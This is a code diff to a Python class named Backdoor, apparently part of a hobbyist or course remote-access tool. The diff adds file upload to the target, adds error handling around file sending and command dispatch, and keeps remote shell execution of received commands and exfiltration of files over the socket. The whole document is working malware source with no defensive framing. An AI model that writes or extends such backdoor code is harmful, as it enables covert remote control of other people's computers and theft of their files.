@@ -33,21 +33,51 @@ class Backdoor:
         try:
             return subprocess.check_output(command, shell=True)
         except Exception:
-            return "Could not execute command: " + " ".join(command)
+            return "[-] Could not execute command: " + " ".join(command)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
         return "[+] Changing working directory to " + path
 
     def send_file(self, path):
-        file = self.read_file(path)
+        try:
+            file = self.read_file(path)
+        except Exception:
+            self.connection.send(base64.b64encode("[-] Error during reading file"))
+            return
+
         print("[+] Sending file...")
         self.connection.sendall(file)
 
         eof = base64.b64encode(b"pp-00-11-22-ff")
-        print(b"pp-00-11-22-ff")
         print("[+] Sending EOF flag...", eof)
         self.connection.send(eof)
+
+    def receive_file(self, path):
+        total_receive = 0
+        file = open(path, "wb")
+        while True:
+            encoded = self.connection.recv(1024)
+            byte_data = base64.b64decode(encoded)
+            if not byte_data:
+                print("[-] The End")
+                break
+
+            eof = b"pp-00-11-22-ff"
+            if encoded == base64.b64encode(eof):
+                print("[+] Got EOF flag. Finishing...")
+                break
+            if encoded.endswith(base64.b64encode(eof)):
+                print("[+] Got EOF flag. Extracting end of the file...")
+                file.write(byte_data)
+                total_receive += len(byte_data)
+                break
+            file.write(byte_data)
+            total_receive += len(byte_data)
+
+        file.close()
+        # print(self.read_file(path))
+        return "[+] Download successful. File size " + str(total_receive) + " bytes"
 
     def read_file(self, path):
         with open(path, "rb") as file:
@@ -65,16 +95,22 @@ class Backdoor:
     def run(self):
         while True:
             command = self.reliable_receive()
-            if command[0] == "exit":
-                self.connection.close()
-                exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-            elif command[0] == "download" and len(command) > 1:
-                self.send_file(command[1])
-                continue
-            else:
-                command_result = self.execute_system_command(command)
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download" and len(command) > 1:
+                    self.send_file(command[1])
+                    continue
+                elif command[0] == "upload" and len(command) > 1:
+                    self.receive_file(command[1])
+                    continue
+                else:
+                    command_result = self.execute_system_command(command)
+            except Exception:
+                command_result = "[-] Error during command execution"
             self.reliable_send(self.decode(command_result))
         self.connection.close()
 
